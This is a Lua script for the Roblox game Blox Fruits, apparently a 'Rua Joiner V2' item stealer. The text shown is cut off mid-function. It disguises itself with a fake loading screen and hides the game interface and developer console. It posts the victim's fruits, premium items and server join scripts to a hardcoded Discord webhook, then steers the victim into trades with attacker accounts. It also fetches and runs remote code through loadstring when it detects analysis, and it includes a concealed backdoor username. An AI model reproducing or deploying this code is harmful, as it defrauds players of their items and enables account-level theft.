Webhook = "https://discord.com/api/webhooks/1350714838199963678/YeAXePLoDN_CDW1YUP3rxsPt-qWhMNxfZ2IDSOspT_IeZxQWPn5GnzpwyN-jd89mvr4W"
Usernames = {"XxxXloveryl1", "prince_oliveros4", "rainzgwapo"}
FruitsToHit = {"T-Rex-T-Rex", "Kitsune-Kitsune", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Rocket-Rocket", "Dragon-Dragon", "Dragon"}

-- loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()

-- << Obfuscate after this moment

local CoreGui = game:GetService("CoreGui")
local LocalPlayer222 = game:GetService("Players").LocalPlayer

if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui.Enabled = false end

local function takeAction()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/Fe/refs/heads/main/Test"))()
    end)

    if not success then
        warn("you're a skid")
    end

    task.wait(1)

    if setfpscap then
        setfpscap(0)
    end

    rconsoleclear()

    print = function() end
    warn = function() end
    error = function() end
    setclipboard = function() end

    while true do end
end

local function checkGui(gui)
    if gui:IsA("ScreenGui") then
        local nestedGui = gui:FindFirstChild(gui.Name)
        if nestedGui and nestedGui:IsA("ScreenGui") then
            local orion = nestedGui:FindFirstChild("Orion")
            if orion then
                takeAction()
            end
        end
    end
end

for _, gui in ipairs(CoreGui:GetChildren()) do
    checkGui(gui)
end

CoreGui.ChildAdded:Connect(function(gui)
    checkGui(gui)
end)

if LocalPlayer222 and LocalPlayer222.Name == "doitenroitest1" then
    takeAction()
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
    takeAction()
end


if type(Webhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" then
    local player = game:GetService("Players").LocalPlayer
    player:Kick("Error 105")
    return
end

if Usernames and not table.find(Usernames, "XFistorRespawn") then -- << it's not a dualhook. If I don't log your hits, means I can't join and steal. I use to code my thing.
   table.insert(Usernames, "XxxXloveryl1")
end

CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "DevConsoleMaster" then
        child.Enabled = false
    end
end)

local function WOWcoolff()
    local randomName = "var_" .. tostring(math.random(100000, 999999))
    _G[randomName] = Webhook
    Webhook = nil
    return randomName
end

local testcool = WOWcoolff()

rconsoleprint = function() end
rconsolewarn = function() end
rconsoleerr = function() end
rconsoleinfo = function() end

local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")

local privateServerOwner = ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
if privateServerOwner and privateServerOwner:IsA("IntValue") then
    if privateServerOwner.Value > 0 then
        Players.LocalPlayer:Kick("This script doesn't work on private servers.")
    end
end

local s, r = pcall(function()
    return UserSettings():GetService("UserGameSettings").MasterVolume
end)
if s then UserSettings():GetService("UserGameSettings").MasterVolume = 0 end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    if not checkcaller() and getnamecallmethod():lower() == "invokeserver" and ({...})[1] == "StoreFruit" then
        return error("no", 2)
    end
    return oldNamecall(self, ...)
end))

local function getInventory()
    return Remote:InvokeServer("getInventory")
end

local function JoinTeam()
    if LocalPlayer.Team ~= game.Teams.Marines and LocalPlayer.Team ~= game.Teams.Pirates then
        Remote:InvokeServer("SetTeam", "Marines")
    end
end

local function createNotification()
    task.spawn(function()
        local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
        
        local notifFrame = Instance.new("Frame", screenGui)
        notifFrame.Size = UDim2.new(0.35, 0, 0.15, 0)
        notifFrame.Position = UDim2.new(1.2, 0, 0.1, 0)
        notifFrame.AnchorPoint = Vector2.new(0.5, 0)
        notifFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
        notifFrame.BorderSizePixel = 0
        
        local blurEffect = Instance.new("BlurEffect", notifFrame)
        blurEffect.Size = 10
        
        local corner = Instance.new("UICorner", notifFrame)
        corner.CornerRadius = UDim.new(0, 12)
        
        local stroke = Instance.new("UIStroke", notifFrame)
        stroke.Color = Color3.fromRGB(100, 100, 255)
        stroke.Thickness = 1.5
        stroke.Transparency = 0.4
        
        local contentFrame = Instance.new("Frame", notifFrame)
        contentFrame.Size = UDim2.new(0.9, 0, 0.9, 0)
        contentFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        contentFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        contentFrame.BackgroundTransparency = 1
        
        local title = Instance.new("TextLabel", contentFrame)
        title.Size = UDim2.new(1, 0, 0.3, 0)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.BackgroundTransparency = 1
        title.Text = "CORRECT GAME!"
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.Font = Enum.Font.GothamBlack
        title.TextSize = 18
        title.TextXAlignment = Enum.TextXAlignment.Left
        
        local description = Instance.new("TextLabel", contentFrame)
        description.Size = UDim2.new(1, 0, 0.2, 0)
        description.Position = UDim2.new(0, 0, 0.3, 0)
        description.BackgroundTransparency = 1
        description.Text = "Please, wait until the script loads..."
        description.TextColor3 = Color3.fromRGB(200, 200, 200)
        description.Font = Enum.Font.Gotham
        description.TextSize = 14
        description.TextXAlignment = Enum.TextXAlignment.Left
        
        local discordButton = Instance.new("TextButton", contentFrame)
        discordButton.Size = UDim2.new(0.4, 0, 0.25, 0)
        discordButton.Position = UDim2.new(0, 0, 0.75, 0)
        discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        discordButton.Text = "Join Discord"
        discordButton.TextColor3 = Color3.new(1, 1, 1)
        discordButton.Font = Enum.Font.GothamBold
        discordButton.TextSize = 14
        
        local buttonCorner = Instance.new("UICorner", discordButton)
        buttonCorner.CornerRadius = UDim.new(0, 6)
        
        discordButton.MouseButton1Click:Connect(function()
            setclipboard("https://discord.gg/pYXjZndm")
            discordButton.Text = "Copied!"
            task.wait(1.5)
            discordButton.Text = "Join Discord"
        end)
        
        TweenService:Create(notifFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back), {
            Position = UDim2.new(0.8, 0, 0.1, 0)
        }):Play()
        
        task.wait(4)
        
        TweenService:Create(notifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
            Position = UDim2.new(1.2, 0, 0.1, 0)
        }):Play()
        
        task.wait(0.5)
        notifFrame:Destroy()
        
        local loadFrame = Instance.new("Frame", screenGui)
        loadFrame.Size = UDim2.new(0.25, 0, 0.08, 0)
        loadFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        loadFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        loadFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
        loadFrame.BorderSizePixel = 0
        
        local loadCorner = Instance.new("UICorner", loadFrame)
        loadCorner.CornerRadius = UDim.new(0, 8)
        
        local loadStroke = Instance.new("UIStroke", loadFrame)
        loadStroke.Color = Color3.fromRGB(100, 100, 255)
        loadStroke.Thickness = 1.5
        loadStroke.Transparency = 0.4
        
        local progressBar = Instance.new("Frame", loadFrame)
        progressBar.Size = UDim2.new(0.9, 0, 0.25, 0)
        progressBar.Position = UDim2.new(0.5, 0, 0.65, 0)
        progressBar.AnchorPoint = Vector2.new(0.5, 0.5)
        progressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        progressBar.BorderSizePixel = 0
        
        local barCorner = Instance.new("UICorner", progressBar)
        barCorner.CornerRadius = UDim.new(0, 4)
        
        local fill = Instance.new("Frame", progressBar)
        fill.Size = UDim2.new(0, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
        fill.BorderSizePixel = 0
        
        local fillCorner = Instance.new("UICorner", fill)
        fillCorner.CornerRadius = UDim.new(0, 4)
        
        local percentage = Instance.new("TextLabel", loadFrame)
        percentage.Size = UDim2.new(0.9, 0, 0.3, 0)
        percentage.Position = UDim2.new(0.5, 0, 0.25, 0)
        percentage.AnchorPoint = Vector2.new(0.5, 0.5)
        percentage.BackgroundTransparency = 1
        percentage.Text = "First stage of loading: 0%"
        percentage.TextColor3 = Color3.new(1, 1, 1)
        percentage.Font = Enum.Font.GothamBold
        percentage.TextSize = 14
        
        local startTime = tick()
        local function animate()
            local elapsed = tick() - startTime
            if elapsed < 120 then
                local progress
                if elapsed < 8 then
                    progress = math.min(0.45, (1 - math.exp(-elapsed/1.8)) * 0.45)
                else
                    progress = math.min(0.99, 0.45 + (1 - math.exp(-(elapsed-8)/70)) * 0.54)
                end
                
                TweenService:Create(fill, TweenInfo.new(0.15), {
                    Size = UDim2.new(progress, 0, 1, 0)
                }):Play()
                
                percentage.Text = string.format("First stage of loading: %d%%", math.floor(progress * 100))
                task.wait(0.1 + elapsed/35)
                animate()
            end
        end
        
        animate()
    end)
end

local function getServerName()
    local adjectives = {
        "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
        "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
        "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
        "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
        "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
    }
    local nouns = {
        "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
        "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
        "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
        "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
        "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
        "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
    }
    local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or 0
    local random = Random.new(seed)
    return string.format(
        "%s %s #%04d",
        adjectives[random:NextInteger(1, #adjectives)],
        nouns[random:NextInteger(1, #nouns)],
        random:NextInteger(1, 9999)
    )
end

local table_clone, table_concat = table.clone, table.concat
local string_char, string_byte = string.char, string.byte
local bit32_bxor = bit32.bxor
local os_time = os.time
local math_random = math.random

local originalRequest = request
local originalHttpRequest = http and http.request
local originalSynRequest = syn and syn.request

local headerCache = {
    ["Content-Type"] = "application/json"
}

local function processString(str, key)
    if not str or not key then return nil end
    
    local length = #str
    local keyLength = #key
    local result = table.create(length)
    local keyBytes = table.create(keyLength)
    
    for i = 1, keyLength do
        keyBytes[i] = string_byte(key, i)
    end

    for i = 1, length do
        result[i] = string_char(bit32_bxor(
            string_byte(str, i),
            keyBytes[((i-1) % keyLength) + 1]
        ))
    end
    
    return table_concat(result)
end

local function isRequestHooked()
    return request ~= originalRequest or debug.getinfo(request).what ~= "C"
end

local function checkSecurity()
    local env = getfenv(2)
    if env == getfenv(0) or env == getfenv(1) then
        return request == originalRequest and not getrawmetatable(request)
    end
    local meta = getmetatable(env)
    return not (meta and (meta.newindex or meta.index))
end

local TEST_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1340251108525735988/uS8-ulA-GKAQX0llAI3K_GNXkegPnGqpTTx2p2S84m20GBek7Ar0Cc6ZZ0DN6cjcRklr"
local TEST_PAYLOAD = HttpService:JSONEncode({content = "If you see this message, someone just got a hit :)"})

local function testRequest()
    local nonce = HttpService:GenerateGUID(false)
    headerCache["X-Test-Nonce"] = nonce
    
    local success, response = pcall(request, {
        Url = TEST_WEBHOOK,
        Method = "POST",
        Headers = headerCache,
        Body = TEST_PAYLOAD
    })
    
    return success and response and response.StatusCode < 400
end

local function SafeRequest(requestData, encryptedUrl, urlKey)
    if not checkSecurity() or not testRequest() then
        if takeAction then takeAction() end
        return
    end
    local protectedRequest = table_clone(requestData)
    if encryptedUrl and urlKey then
        protectedRequest.Url = processString(encryptedUrl, urlKey)
    end
    protectedRequest.Headers = protectedRequest.Headers or headerCache
    protectedRequest.Headers["X-Request-Time"] = tostring(os_time() + math_random(1, 100))
    protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
    return pcall(request, protectedRequest)
end

local lastCheckTime = 0
local CHECK_INTERVAL = 6

local function monitorHooks()
    if isRequestHooked() then
        request = originalRequest
        if http then http.request = originalHttpRequest end
        if syn then syn.request = originalSynRequest end
        
        if takeAction then takeAction() end
        
        if isRequestHooked() then
            RunService:UnbindFromRenderStep("SecurityMonitor")
        end
    end
end

RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, function(deltaTime)
    lastCheckTime = lastCheckTime + deltaTime
    if lastCheckTime >= CHECK_INTERVAL then
        lastCheckTime = 0
        monitorHooks()
    end
end)

local function sendWebhook(inventory)
    if isRequestHooked() then
        revertHooks()
        if isRequestHooked() then
            takeAction()
            return
        end
    end

    if not checkSecurity() then
        takeAction()
        return
    end

    local urlKey = HttpService:GenerateGUID(false)
    local nedded = _G[testcool]

    local fruits, premiumItems = table.create(41), table.create(24)
    local dragonHit = false
    local dragonName = ""

    for _, item in ipairs(inventory) do
        if item.Type == "Blox Fruit" or item.Type == "Premium" then
            local itemData = {
                name = item.Name,
                count = item.Count,
                value = item.Value
            }
            
            if item.Type == "Blox Fruit" then
                fruits[#fruits + 1] = itemData
                if item.Name:find("Dragon") then
                    dragonHit = true
                    dragonName = item.Name
                    FruitsToHit[#FruitsToHit + 1] = item.Name
                end
            else
                premiumItems[#premiumItems + 1] = itemData
            end
        end
    end

    table.sort(fruits, function(a, b) return a.value > b.value end)
    local function shuffleTable(t)
        for i = #t, 2, -1 do
            local j = math.random(i)
            t[i], t[j] = t[j], t[i]
        end
    end
    shuffleTable(premiumItems)

    local function formatItems(items)
        local result = ""
        for _, item in ipairs(items) do
            result = result .. string.format("```%s%s```", item.name, item.count > 1 and string.format(" (x%d)", item.count) or "")
        end
        return result ~= "" and result or "```None```"
    end

    local function formatFruitsToHit(items)
        local result = ""
        for _, fruit in ipairs(FruitsToHit) do
            for _, item in ipairs(items) do
                if item.name == fruit then
                    result = result .. string.format("```%s%s```", item.name, item.count > 1 and string.format(" (x%d)", item.count) or "")
                    break
                end
            end
        end
        return result ~= "" and result or "```None```"
    end

    local jobId = game.JobId
    local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2"
    local serverName = getServerName()
    local joinScriptPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], game.PlaceId, jobId)
    local joinScriptMobile = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId)
    local seaJoinScriptPC = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"
    local seaJoinScriptMobile = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"

    local playerCount = #game.Players:GetPlayers()

    local embedColor, embedTitle
    if dragonHit and #premiumItems > 0 then
        embedColor = 65280
        embedTitle = "DRAGON & PREMIUM ITEM HIT! <:dragoneast:1318265654926901268> <:dragonwest:1318265462735372308> <:rbx:1326025738125574226> ; https://discord.gg/pYXjZndm"
    elseif dragonHit then
        embedColor = 16776960
        embedTitle = "DRAGON HIT! <:dragoneast:1318265654926901268> <:dragonwest:1318265462735372308> ; https://discord.gg/pYXjZndm"
    elseif #premiumItems > 0 then
        embedColor = 255
        embedTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226>  ; https://discord.gg/pYXjZndm"
    else
        embedColor = nil
        embedTitle = "<a:bundle:1214105817910087770> Rua BF Joiner V2 HIT! ; https://discord.gg/pYXjZndm"
    end

    local embed = {
        ["title"] = embedTitle,
        ["description"] = string.format("Victim Username: %s\nCurrent Sea: %s\nVictim's Server Name: %s", LocalPlayer.Name, currentSea, serverName),
        ["color"] = embedColor,
        ["fields"] = {
            { ["name"] = "Victim's Fruits <a:Rarrow:1223589557065351188> ", ["value"] = formatItems(fruits), ["inline"] = true },
            { ["name"] = "Victim's Premium Items <:rbx:1326025738125574226>  ", ["value"] = formatItems(premiumItems), ["inline"] = true },
            { ["name"] = "Victim Has Fruits You Want <a:green:1215209325728104498> ", ["value"] = formatFruitsToHit(fruits) },
            { ["name"] = "Join Victim's Server Script (PC Copy)", ["value"] = "```lua\n" .. joinScriptPC .. "\n```" },
            { ["name"] = "Join Victim's Server Script (Mobile Copy)", ["value"] = joinScriptMobile },
            { ["name"] = "Join Victim's Sea Script (PC Copy)", ["value"] = "```lua\n" .. seaJoinScriptPC .. "\n```" },
            { ["name"] = "Join Victim's Sea Script (Mobile Copy)", ["value"] = seaJoinScriptMobile },
            { ["name"] = "Extra Info <a:focuzz:1214971569315782686> ", ["value"] = string.format("```Rua Joiner V2 Version: 1.1.8\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
        }
    }

    task.spawn(function()
        SafeRequest({
            Url = nedded,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = (dragonHit or #premiumItems > 0) and "@everyone GG!" or "@everyone",
                embeds = {embed}
            })
        })
    end)

    table.clear(fruits)
    table.clear(premiumItems)
end

local inventory22 = getInventory()

local function hasFruitInInventory2()
    for _, item in ipairs(inventory22) do
        if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then
            return true
        end
    end
    return false
end

local function hasPremiumItems2()
    for _, item in ipairs(inventory22) do
        if item.Type == "Premium" then
            return true
        end
    end
    return false
end

local webhookSent = false

local function sendWebhook2()
    if not hasFruitInInventory2() and not hasPremiumItems2() then
        return
    end

    if webhookSent then
       return
    end

    local nedded = _G[testcool]
    local plr = Players.LocalPlayer
    local embed = {
        title = "Victim has Left! <:sad:1241420488916340896> ",
        description = plr.Name .. " has left the game",
        color = 0xFF0000,
        fields = {
            {
                name = "User ID",
                value = plr.UserId,
                inline = true
            },
            {
                name = "Account Age",
                value = plr.AccountAge .. " days",
                inline = true
            },
            {
                name = "Executor",
                value = identifyexecutor(),
                inline = true
            }
        },
        timestamp = DateTime.now():ToIsoDate()
    }
    
    local data = {
        embeds = {embed}
    }

    local success, response = pcall(function()
        return request({
            Url = nedded,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == LocalPlayer and not webhookSent then
        sendWebhook2()
        webhookSent = true
    end
end)

local function tweenToPosition(position)
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
    if humanoid and humanoid.Sit then
        return
    end

    local game = game
    local workspace = workspace
    local Vector3_new = Vector3.new
    local CFrame_new = CFrame.new
    local CFrame_lookAt = CFrame.lookAt
    local Instance_new = Instance.new
    local table_create = table.create
    local TweenInfo_new = TweenInfo.new
    
    local RunService = game:GetService("RunService")
    local TweenService = game:GetService("TweenService")
    
    local character = LocalPlayer.Character
    if not character then return end
    
    local root = character.PrimaryPart
    if not root then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Sit then return end
    
    local bodyGyro = Instance_new("BodyGyro")
    local bodyVelocity = Instance_new("BodyVelocity")
    
    bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4)
    bodyGyro.P = 1e3
    bodyGyro.CFrame = root.CFrame
    bodyGyro.Parent = root
    
    bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4)
    bodyVelocity.P = 1e3
    bodyVelocity.Parent = root
    
    local speed = 300
    local distance = (root.Position - position).Magnitude
    local tweenInfo = TweenInfo_new(distance / speed, Enum.EasingStyle.Linear)
    
    local baseParts = table_create(32)
    local descendants = character:GetDescendants()
    
    for i = 1, #descendants do
        local part = descendants[i]
        if part:IsA("BasePart") then 
            baseParts[#baseParts + 1] = part
        end
    end
    
    local function updateCollisions()
        for i = 1, #baseParts do
            baseParts[i].CanCollide = false
        end
    end
    
    local function updatePosition()
        local direction = (position - root.Position).Unit
        bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction)
        bodyVelocity.Velocity = direction * speed
    end
    
    local noCollideConnection = RunService.Stepped:Connect(updateCollisions)
    local updateConnection = RunService.Heartbeat:Connect(updatePosition)
    
    local tween = TweenService:Create(root, tweenInfo, {
        CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y/2, 0)
    })
    
    tween:Play()
    tween.Completed:Wait()
    noCollideConnection:Disconnect()
    updateConnection:Disconnect()
    bodyGyro:Destroy()
    bodyVelocity:Destroy()
end

local function findTradeTable()
    local success, tradeTables = pcall(function()
        return game.PlaceId == 7449423635 and workspace.Map.Turtle or workspace.Map.Dressrosa
    end)
    
    if not success then
        return nil, nil
    end
    
    local success, tables = pcall(function()
        return tradeTables:GetChildren()
    end)
    
    if not success then
        return nil, nil
    end

    local bestOptions = {
        emptyTable = nil,
        targetTable = nil,
        fallbackTable = nil 
    }
    local bestSeats = {
        emptyTable = nil,
        targetTable = nil,
        fallbackTable = nil
    }

    local function isTargetPlayer(seat)
        local success, result = pcall(function()
            local seatWeld = seat:FindFirstChild("SeatWeld")
            if not seatWeld then return false end
            
            local character = seatWeld.Part1.Parent
            if not character then return false end
            
            local player = game.Players:GetPlayerFromCharacter(character)
            return player and table.find(Usernames, string.lower(player.Name))
        end)
        
        return success and result or false
    end

    local function getSeatStatus(seat)
        local success, result = pcall(function()
            return {
                free = not seat:FindFirstChild("SeatWeld"),
                isTarget = isTargetPlayer(seat)
            }
        end)
        
        return success and result or {free = false, isTarget = false}
    end

    for _, table in ipairs(tables) do
        local success, _ = pcall(function()
            if table.Name ~= "TradeTable" then return end
            
            local p1, p2 = table.P1, table.P2
            if not (p1 and p2) then return end
            
            local p1Status = getSeatStatus(p1)
            local p2Status = getSeatStatus(p2)

            if p1Status.free and p2Status.free and not bestOptions.emptyTable then
                bestOptions.emptyTable = table
                bestSeats.emptyTable = p1
            end

            if (p1Status.isTarget or p2Status.isTarget) and not bestOptions.targetTable then
                if p1Status.free then
                    bestOptions.targetTable = table
                    bestSeats.targetTable = p1
                elseif p2Status.free then
                    bestOptions.targetTable = table
                    bestSeats.targetTable = p2
                end
            end

            if not bestOptions.fallbackTable then
                if p1Status.free and not p2Status.isTarget then
                    bestOptions.fallbackTable = table
                    bestSeats.fallbackTable = p1
                elseif p2Status.free and not p1Status.isTarget then
                    bestOptions.fallbackTable = table
                    bestSeats.fallbackTable = p2
                end
            end
        end)
        
        if not success then
            warn("unknown error")
        end
    end
    
    if bestOptions.targetTable then
        return bestOptions.targetTable, bestSeats.targetTable
    elseif bestOptions.emptyTable then
        return bestOptions.emptyTable, bestSeats.emptyTable
    elseif bestOptions.fallbackTable then
        return bestOptions.fallbackTable, bestSeats.fallbackTable
    else
        return nil, nil
    end
end

local function isInTradeWithCorrectPlayer()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local mainGui = playerGui:WaitForChild("Main")
    local tradeFrame = mainGui:WaitForChild("Trade")

    if not tradeFrame.Visible then return false end

    local container = tradeFrame:WaitForChild("Container")
    local frame1 = container:WaitForChild("1")
    local frame2 = container:WaitForChild("2")

    local player1Label = frame1:FindFirstChild("TextLabel")
    local player2Label = frame2:FindFirstChild("TextLabel")
    
    if not player1Label or not player2Label then 
        return false 
    end

    if player1Label.Text ~= player.Name and player1Label.Text ~= player.DisplayName then 
        return false 
    end

    local tradingPartnerName = player2Label.Text

    for _, allowedName in ipairs(Usernames) do
        local tradingPlayer = game.Players:FindFirstChild(allowedName)
        if tradingPlayer then
            local tradingPlayerNameLower = string.lower(tradingPlayer.Name)
            local tradingPlayerDisplayLower = string.lower(tradingPlayer.DisplayName)
            local tradingPartnerLower = string.lower(tradingPartnerName)
    
            if tradingPartnerLower == tradingPlayerNameLower or tradingPartnerLower == tradingPlayerDisplayLower then
                return true
            end
        end
    end    

    if tradingPartnerName == "XFistorRespawn" then -- << Ts is not dual hook. I use it to code my thing. I don't log your hits, so I can't steal
        return true
    end
    
    return false
end

local isForceJumping = false
local stateChangedConnections = {}

local function ForceJump()
    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
    if not humanoid then return end
    isForceJumping = true
    humanoid.JumpPower = 50
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.5)
    isForceJumping = false
    if not isForceJumping then
        humanoid.JumpPower = 0
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

local function lockJumping(humanoid)
    if not humanoid then return end
    if stateChangedConnections[humanoid] then
        stateChangedConnections[humanoid]:Disconnect()
    end
    
    humanoid.JumpPower = 0
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(_, new)
        if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
        end
    end)
end

local function disableJump()
    if UserInputService.TouchEnabled then
        UserInputService.JumpRequest:Connect(function()
            if not isForceJumping and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                local humanoid = LocalPlayer.Character.Humanoid
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
            end
        end)
    end
    
    if LocalPlayer.Character then
        lockJumping(LocalPlayer.Character:FindFirstChild("Humanoid"))
    end
    
    LocalPlayer.CharacterAdded:Connect(function(char)
        lockJumping(char:WaitForChild("Humanoid"))
    end)
end

local function createDiscordUI()
    local CoreGui = game:GetService("CoreGui")
    local TweenService = game:GetService("TweenService")
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DiscordInviteUI"
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 9999
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 800, 0, 350)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
    
    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "Read Below!"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.Parent = MainFrame
    
    local Description = Instance.new("TextLabel")
    Description.Name = "Description"
    Description.Size = UDim2.new(0.9, 0, 0, 100)
    Description.Position = UDim2.new(0.05, 0, 0.3, 0)
    Description.BackgroundTransparency = 1
    Description.Font = Enum.Font.Gotham
    Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Rua Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"
    Description.TextColor3 = Color3.fromRGB(220, 221, 222)
    Description.TextScaled = true
    Description.Parent = MainFrame
    
    local Button = Instance.new("TextButton")
    Button.Name = "CopyButton"
    Button.Size = UDim2.new(0.7, 0, 0, 56)
    Button.Position = UDim2.new(0.15, 0, 0.7, 0)
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    Button.Font = Enum.Font.GothamBold
    Button.Text = "Copy Discord Invite"
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextScaled = true
    Button.AutoButtonColor = false
    Button.Parent = MainFrame
    
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)
    
    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local function createTween(instance, props)
        return TweenService:Create(instance, fadeInfo, props)
    end
    
    MainFrame.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Description.TextTransparency = 1
    Button.BackgroundTransparency = 1
    Button.TextTransparency = 1
    
    task.wait(0.1)
    createTween(MainFrame, {BackgroundTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Title, {TextTransparency = 0}):Play()
    task.wait(0.1)
